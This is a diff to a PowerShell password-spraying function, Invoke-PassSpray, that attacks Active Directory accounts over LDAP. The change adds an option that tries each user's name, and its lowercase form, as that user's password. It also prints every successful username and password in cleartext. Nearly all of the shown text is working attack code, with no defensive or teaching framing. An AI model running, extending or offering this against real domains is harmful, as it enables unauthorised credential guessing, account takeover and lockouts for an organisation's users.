@@ -17,7 +17,9 @@ function Invoke-PassSpray {
 		[string]
         $Domain,
 		[string]
-        $DomainController
+        $DomainController,
+		[switch]
+		$UserAsPassword
     )
 	
 	if(!$Domain){
@@ -64,11 +66,22 @@ function Invoke-PassSpray {
      	
 	foreach($usr in $AllUsers){
 		try {
-		        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAPPath, $usr, $Password)
-		        if ($directoryEntry.name -ne $null) {
-		            Write-Output "[+] Authentication Successful for user $usr"
-		            $KeepTrack = $True
-		        }
+		        $PasswordList = @()  # Always initialise it cleanly
+
+				if ($UserAsPassword) {
+					$PasswordList = @($usr, $usr.ToLower())
+					$PasswordList = $PasswordList | Sort-Object -Unique
+				} else { $PasswordList = @($Password)}
+				
+				foreach($passwd in $PasswordList){
+					$directoryEntry = New-Object System.DirectoryServices.DirectoryEntry("$LDAPPath", "$Domain\$usr", "$passwd")
+					if ($directoryEntry.name -ne $null) {
+						if($passwd){
+							Write-Output "[+] Authentication Successful for user $usr using password $passwd"
+						} else { Write-Output "[+] Authentication Successful for user $usr using an empty password" }
+						$KeepTrack = $True
+					}
+				}
 		} catch {}
 	}
  	if($KeepTrack -eq $False){Write-Output "[-] No Success"}
